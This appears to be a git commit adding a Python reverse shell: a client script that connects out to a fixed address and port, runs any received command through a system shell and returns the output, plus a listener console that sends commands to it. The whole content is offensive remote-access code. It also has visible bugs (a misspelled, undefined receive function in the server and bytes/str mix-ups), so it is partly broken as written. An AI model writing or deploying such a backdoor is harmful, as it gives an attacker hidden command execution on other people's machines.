d17548969de0a4c08559818a60ff1e06519ee4af
Avi <qwe123kids@Wgmail.com>
2023-03-12 22:03:58 -0600

    Reverse shell

---
+++ reverse_shell/reverseShell.py
@@ -0,0 +1,35 @@
+#!/usr/bin/python
+
+import socket
+import subprocess
+import json
+def relibale_send(data):
+	json_data = json.dumps(data)
+	sock.send(json_data)
+
+def reliable_recv():
+	data = ""
+	while True:
+		try :
+			data = data + str(sock.recv(1024).decode("utf-8"))
+			return json.loads(data)
+		except ValueError:
+			continue
+
+
+def shell():
+	while True:
+		command = reliable_recv()
+		if command == 'q':
+			break
+		else:
+			proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
+			result = proc.stdout.read() + proc.stderr.read()
+			relibale_send(result)
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.connect(("192.168.0.21", 54321))
+shell()
+sock.close()
+
+
---
+++ reverse_shell/server.py
@@ -0,0 +1,51 @@
+#!/usr/bin/python
+
+import socket
+from termcolor import colored
+import json
+def relibale_send(data):
+        json_data = json.dumps(data)
+        target.send(json_data)
+
+def reliable_recv():
+        data = ""
+        while True:
+                try :
+                        data = data + str(target.recv(1024).decode("utf-8"))
+                        return json.loads(data)
+                except ValueError:
+                        continue
+
+
+
+def shell():
+	while True:
+		command = input("* Shell#-%s: " % str(ip))
+		relibale_send(command)
+		if command =='q':
+			break
+		else:
+			result = relibale_recv()
+			print(result)
+
+
+
+
+def server():
+	global s
+	global ip
+	global target
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
+	s.bind(("192.168.0.21", 54321))
+	s.listen(5)
+
+	print(colored("[+] Listening for incoming Conncection","green"))
+	target , ip = s.accept()
+	print(target)
+	print(colored("[+] Connection Established fpr : %s  " % str(ip) , "green"))
+	
+
+server()
+shell()
+s.close()
